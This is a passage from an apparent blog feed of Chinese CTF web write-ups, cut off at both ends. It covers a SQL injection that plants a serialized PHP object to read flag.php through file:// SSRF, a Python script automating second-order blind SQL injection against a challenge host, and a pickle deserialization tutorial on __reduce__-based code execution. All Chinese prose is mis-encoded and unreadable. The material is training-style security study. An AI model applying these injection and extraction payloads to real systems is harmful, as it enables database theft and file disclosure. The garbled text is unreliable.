class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¾ˆæ˜æ˜¾dataçš„æ•°æ®å°±æ˜¯è¿™ä¸ª<code>UserInfo</code>ç±»ï¼Œå†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ³¨å†Œç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åè¿™é‡Œéœ€è¦è”æƒ³ä¸€ä¸‹ï¼Œ,å› ä¸ºæºç é‡Œé¢å¾ˆæ˜æ˜¾è¦SSRFæ‰“å†…ç½‘ï¼Œè¿™é‡Œåˆéœ€è¦åºåˆ—åŒ–ï¼Œç»“åˆæŠ¥é”™æ¶ˆæ¯<code>**Notice**: unserialize(): Error at offset 0 of 1 bytes in **/var/www/html/view.php** on line **31**</code>æƒ³åˆ°çš„å°±æ˜¯å¯ä»¥ç”¨selectæŸ¥è¯¢æˆ‘ä»¬æ„é€ çš„dataæ•°æ®ï¼Œå»æ‰§è¡Œ<code>getBlogContents ()</code>æ¥è¾¾åˆ°SSRFã€‚æ„é€ <code>O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1 union&#x2F;**&#x2F;select  1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;<br><br>æ‹¿åˆ°flag<br>&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxZmE2ZDUzOS0xZTUyLTQyZjctYTk4NS1mMDZhOTU1NWQ0MmR9IjsNCmV4aXQoMCk7DQo&#x3D;&#39;&gt;<br></code></pre></div></td></tr></table></figure><h1 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h1><p>è¿›å…¥ç•Œé¢æ˜¯ä¸€ä¸ªç™»å½•ï¼Œä¹Ÿæ²¡æœ‰ç»™æ³¨å†ŒæŒ‰é’®ï¼Œé‚£å°±å…ˆæ‰«ç›®å½•å§ï¼Œæœç„¶æ‰«å‡ºæ¥äº†ä¸ª<code>register.php</code>ï¼Œæ³¨å†Œç•Œé¢æ˜¯éœ€è¦é‚®ç®±ï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼Œä½†ç™»å½•ç•Œé¢åªéœ€è¦ç”¨é‚®ç®±å’Œå¯†ç ï¼Œç™»å½•è¿›å»åå›æ˜¾å‡ºæ¥äº†ç”¨æˆ·åï¼Œä¼¼ä¹åˆæ˜¯äºŒæ¬¡æ³¨å…¥ã€‚</p><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤æ‰äº†<code>, information</code>ç­‰ï¼Œé‚£leftï¼Œrightå‡½æ•°å°±ç”¨ä¸äº†äº†ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨hexäºŒæ¬¡ç¼–ç ï¼ŒäºŒæ¬¡ç¼–ç åçš„é•¿åº¦å¤ªé•¿äº†ï¼Œå†ç”¨<code>from for</code>æˆªå–æ¥çˆ†ç ´å‡ºæƒ³è¦å¾—åˆ°çš„ç»“æœï¼Œè½¬ç å°±è¡Œäº†ã€‚å¦ä¸ªä¸€ä½¿ç”¨asciiåŠ ä¸Š</p><p>æµ‹è¯•pyload<code>0&#39;+ascii(substr(databases()) from 1 for 1)+&#39;0;</code></p><p>0â€™+ascii(substr((select * from flag) from {} for 1))+â€™0;</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://5a23b673-9495-4dec-b80c-5cf3bf553d2f.node4.buuoj.cn:81/&#x27;</span><br>s = string.ascii_letters+string.ascii_uppercase+string.digits<br>ses = requests.session()<br>repatter = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;span class=&quot;user-name&quot;&gt;[\s]+([\w]+)[\s]+&lt;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        resister_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>        <span class="hljs-comment"># payload = &quot;0&#x27;+ascii(substr((select database()) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i)       #æ•°æ®åº“ä¸ºweb</span><br>        payload = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        resister_res = requests.post(resister_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                        <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>                                                        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        <span class="hljs-comment"># print(resister_res)</span><br>        login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>        loginres = requests.post(login_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                  <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        content = re.findall(repatter,loginres)<br>        result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(content[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(result)  <span class="hljs-comment">#flag&#123;e3fd3970-c860-4e90-b4ed-189491a9047f&#125;</span><br>exp()<br><br>å¦ä¸€ç§ç”¨<span class="hljs-number">0</span><span class="hljs-string">&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;</span><span class="hljs-number">0</span> åŸç†ä¹Ÿæ˜¯å·®ä¸å¤šçš„<br></code></pre></div></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œè¿™å‡ ä¸ªé¢˜å¤§éƒ½è€ƒçš„æ˜¯æ³¨å…¥ï¼Œç©¿æ’äº†ä¸€ä¸‹å…¶ä»–çš„è€ƒç‚¹åƒåºåˆ—åŒ–ç„¶åssrfï¼Œå†æ¬¡ç†Ÿæ‚‰äº†äºŒæ¬¡æ³¨å…¥çš„åŸç†åŠå¯èƒ½å‡ºç°çš„åœ°æ–¹ï¼Œä¸å¾—ä¸è¯´è¿™å‡ ä¸ªé¢˜ç›®è¿˜ä¸é”™ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickleå­¦ä¹ </title>
    <link href="/2021/08/11/2021-8-10-pickle%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/08/11/2021-8-10-pickle%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p>å…³äº<code>pickle</code>çš„çŸ¥è¯†</p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p><p>â€‹            <a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p><p>â€‹            <a href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a></p><p>pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ªæ ‡å‡†æ¨¡å—ï¼Œå®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚<br>pickleæ¨¡å—æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆä¿å­˜æ–‡ä»¶çš„åç¼€ä¸º<code>.pkl</code>ï¼‰ï¼Œä¸èƒ½ç›´æ¥æ‰“å¼€è¿›è¡Œé¢„è§ˆã€‚</p><p><code>pickle.dumps</code>å°†å¯¹è±¡ååºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œ<code>pickle.dump</code>å°†ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å­˜å‚¨ä¸ºæ–‡ä»¶ã€‚</p><p><code>pickle.loads() </code>å¯¹è±¡ååºåˆ—åŒ– <code>pickle.load()</code> å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚</p><blockquote><p>#åºåˆ—åŒ– pickle.dump(obj, file, protocol=None,) objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰ fileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡ ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰ </p><p>#ååºåˆ—åŒ– pickle.load(file, *, fix_imports=True, encoding=â€ASCIIâ€, errors=â€strictâ€, buffers=None) fileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡ ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)</p></blockquote><blockquote><p>#åºåˆ—åŒ– pickle.dumps(obj, protocol=None,*,fix_imports=True) dumps()æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„byteså¯¹è±¡ã€‚</p><p>#ååºåˆ—åŒ– pickle.loads(bytes_object, *,fix_imports=True, encoding=â€ASCIIâ€. errors=â€strictâ€) loads()æ–¹æ³•æ˜¯ç›´æ¥ä»byteså¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚</p></blockquote><p>ç®€å•çœ‹ä¸€ä¸‹åºåˆ—åŒ–åç»“æœï¼Œç”¨çš„æ˜¯<code>pickle0ç‰ˆæœ¬</code>çœ‹çš„æ›´æ¸…æ¥šä¸€ç‚¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: gbk -*-</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,a,b</span>):</span><br>        self.a = a<br>        self.b = b<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    demo = Test(<span class="hljs-string">&#x27;KK&#x27;</span>,<span class="hljs-string">&#x27;fine&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.pkl&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        pickle.dump(demo,f,protocol=<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.pkl&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-built_in">print</span>(pickle.load(f))<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7e76970ea22942ee8ff360af46d7e185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŒ‡ä»¤é›†çš„ä»‹ç»ï¼Œå…·ä½“å’ŒPVMæœ‰å…³ã€‚å…ˆå¯çœ‹çœ‹è¿™å¼ å›¾ï¼Œæ¯ä¸ª<code>protocol</code>ç‰ˆæœ¬ä¸ä¸€æ ·çš„è¯ï¼Œåºåˆ—åŒ–å‡ºæ¥çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><ol><li><code>c</code>ï¼šå¼•å…¥æ¨¡å—å’Œå¯¹è±¡ï¼Œæ¨¡å—åå’Œå¯¹è±¡åä»¥æ¢è¡Œç¬¦åˆ†å‰²ã€‚ï¼ˆ<code>find_class</code>æ ¡éªŒå°±åœ¨è¿™ä¸€æ­¥ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦cè¿™ä¸ªOPCODEçš„å‚æ•°æ²¡æœ‰è¢«<code>find_class</code>é™åˆ¶ï¼Œå…¶ä»–åœ°æ–¹è·å–çš„å¯¹è±¡å°±ä¸ä¼šè¢«æ²™ç›’å½±å“äº†ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä¸ºä»€ä¹ˆè¦ç”¨getattræ¥è·å–å¯¹è±¡ï¼‰</li><li><code>(</code>ï¼šå‹å…¥ä¸€ä¸ªæ ‡å¿—åˆ°æ ˆä¸­ï¼Œè¡¨ç¤ºå…ƒç»„çš„å¼€å§‹ä½ç½®</li><li><code>t</code>ï¼šä»æ ˆé¡¶å¼€å§‹ï¼Œæ‰¾åˆ°æœ€ä¸Šé¢çš„ä¸€ä¸ª<code>(</code>ï¼Œå¹¶å°†<code>(</code>åˆ°<code>t</code>ä¸­é—´çš„å†…å®¹å…¨éƒ¨å¼¹å‡ºï¼Œç»„æˆä¸€ä¸ªå…ƒç»„ï¼Œå†æŠŠè¿™ä¸ªå…ƒç»„å‹å…¥æ ˆä¸­</li><li><code>R</code>ï¼šä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªå¯æ‰§è¡Œå¯¹è±¡å’Œä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä½œä¸ºå‡½æ•°çš„å‚æ•°åˆ—è¡¨æ‰§è¡Œï¼Œå¹¶å°†è¿”å›å€¼å‹å…¥æ ˆä¸Š</li><li><code>p</code>ï¼šå°†æ ˆé¡¶çš„å…ƒç´ å­˜å‚¨åˆ°memoä¸­ï¼Œpåé¢è·Ÿä¸€ä¸ªæ•°å­—ï¼Œå°±æ˜¯è¡¨ç¤ºè¿™ä¸ªå…ƒç´ åœ¨memoä¸­çš„ç´¢å¼•</li><li><code>V</code>ã€<code>S</code>ï¼šå‘æ ˆé¡¶å‹å…¥ä¸€ä¸ªï¼ˆunicodeï¼‰å­—ç¬¦ä¸²</li><li><code>.</code>ï¼šè¡¨ç¤ºæ•´ä¸ªç¨‹åºç»“æŸ</li></ol><p><img src="https://image.3001.net/images/20201016/1602833405_5f894bfd4cd7bd1a9ecc0.png!small?1602833407394" alt="img"></p><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ <code>__reduce__()</code>é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚</p><p>è€Œä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºç¼–ç¨‹è¯­è¨€éœ€è¦æ ¹æ®ååºåˆ—åŒ–å­—ç¬¦ä¸²å»è§£æå‡ºè‡ªå·±ç‹¬ç‰¹çš„è¯­è¨€æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥å°±å¿…é¡»è¦åœ¨å†…éƒ¨æŠŠè§£æå‡ºæ¥çš„ç»“æ„å»æ‰§è¡Œä¸€ä¸‹ã€‚å¦‚æœåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œä¾¿å¯èƒ½ç›´æ¥é€ æˆRCEæ¼æ´.</p><p>å¦å¤–<code>pickle.loads</code>ä¼šè§£å†³<code>import</code>é—®é¢˜ï¼Œå¯¹äºæœªå¼•å…¥çš„<code>module</code>ä¼šè‡ªåŠ¨å°è¯•<code>import</code>ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªpythonæ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½å¯ä»¥è¿›è¡Œä½¿ç”¨ã€‚è¿™é‡Œè´´ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£æŠŠï¼Œè¿™ä¸ªå‡½æ•°è¿˜æŒºå¸¸è§çš„ã€‚</p><p><img src="https://img-blog.csdnimg.cn/b2aba418804f4b98ab539abf1bfae53d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å½“ <code>__reduce__()</code>å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , <strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . <strong>ç¬¬äºŒä¸ªå…ƒç´ </strong>æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚è¿™ç‚¹è·ŸPVMä¸­çš„<code>R</code>æ“ä½œç åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯ä»¥å¯¹æ¯”ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs plain">å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ ã€‚æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ <br></code></pre></div></td></tr></table></figure><p>äº‹å®ä¸Š , <code>R</code>æ“ä½œç å°±æ˜¯ <code>__reduce__()</code>é­”æœ¯å‡½æ•°çš„åº•å±‚å®ç° . è€Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸçš„æ—¶å€™ , Python è¿›ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨ <code>__reduce__()</code>é­”æœ¯æ–¹æ³• . å¦‚æœå¯ä»¥æ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•° , Python è¿›ç¨‹å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç  .</p><h1 id="opcodeè¿›é˜¶"><a href="#opcodeè¿›é˜¶" class="headerlink" title="opcodeè¿›é˜¶"></a>opcodeè¿›é˜¶</h1><p>ç›´æ¥çœ‹å¥½æ–‡<a href="https://xz.aliyun.com/t/7436#toc-5">https://xz.aliyun.com/t/7436#toc-5</a></p><p>â€‹                    <a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p>â€‹                    <a href="https://www.jianshu.com/p/8fd3de5b4843">https://www.jianshu.com/p/8fd3de5b4843</a></p><p>â€‹                    <a href="https://dar1in9s.github.io/2020/03/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E8%8A%B1%E5%BC%8Fimport">https://dar1in9s.github.io/2020/03/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E8%8A%B1%E5%BC%8Fimport</a></p><p>â€‹                    <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p>æ²™ç®±é€ƒé€¸    <a href="https://xz.aliyun.com/t/52#toc-6">https://xz.aliyun.com/t/52#toc-6</a></p><h4 id="opcodeç‰ˆæœ¬"><a href="#opcodeç‰ˆæœ¬" class="headerlink" title="opcodeç‰ˆæœ¬"></a>opcodeç‰ˆæœ¬</h4><p>pickleç”±äºæœ‰ä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼Œåœ¨py3å’Œpy2ä¸­å¾—åˆ°çš„opcodeä¸ç›¸åŒã€‚ä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼ˆæ‰€ä»¥ç”¨v0å°±å¯ä»¥åœ¨æ‰€æœ‰ç‰ˆæœ¬ä¸­æ‰§è¡Œï¼‰ã€‚ç›®å‰ï¼Œpickleæœ‰6ç§ç‰ˆæœ¬ã€‚æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;KKfine&#x27;</span>&#125;<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;# åŸå˜é‡ï¼š<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;pickleç‰ˆæœ¬<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))<br><br><span class="hljs-comment"># è¾“å‡ºï¼š</span><br><span class="hljs-comment"># åŸå˜é‡ï¼š&#123;&#x27;1&#x27;: &#x27;KKfine&#x27;&#125;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">0</span> <span class="hljs-string">b&#x27;(dp0\nV1\np1\nVKKfine\np2\ns.&#x27;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">1</span> <span class="hljs-string">b&#x27;&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">2</span> <span class="hljs-string">b&#x27;\x80\x02&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">3</span> <span class="hljs-string">b&#x27;\x80\x03&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">4</span> <span class="hljs-string">b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x011\x94\x8c\x06KKfine\x94s.&#x27;</span><br>pickleç‰ˆæœ¬<span class="hljs-number">5</span> <span class="hljs-string">b&#x27;\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x011\x94\x8c\x06KKfine\x94s.&#x27;</span><br><br><br><span class="hljs-comment">#å¯¹äºpickleç‰ˆæœ¬3 ï¼š</span><br><span class="hljs-comment"># \x80ï¼šåè®®å¤´å£°æ˜ \x03ï¼šåè®®ç‰ˆæœ¬</span><br><span class="hljs-comment"># \x06\x00\x00\x00ï¼šæ•°æ®é•¿åº¦ï¼š6</span><br><span class="hljs-comment"># KKfineï¼šæ•°æ®</span><br><span class="hljs-comment"># qï¼šå‚¨å­˜æ ˆé¡¶çš„å­—ç¬¦ä¸²é•¿åº¦ï¼šä¸€ä¸ªå­—èŠ‚ï¼ˆå³\x00ï¼‰</span><br><span class="hljs-comment"># \x00ï¼šæ ˆé¡¶ä½ç½®</span><br><span class="hljs-comment"># .ï¼šæ•°æ®æˆªæ­¢</span><br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯åå…­è¿›åˆ¶ä¸å¤ªå¥½è§‚å¯Ÿæ—¶å¦‚ä½•åºåˆ—åŒ–çš„ï¼Œå¯ä»¥ä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼ã€‚</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p><p>æ‹¿ä¸ªä¾‹å­çœ‹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 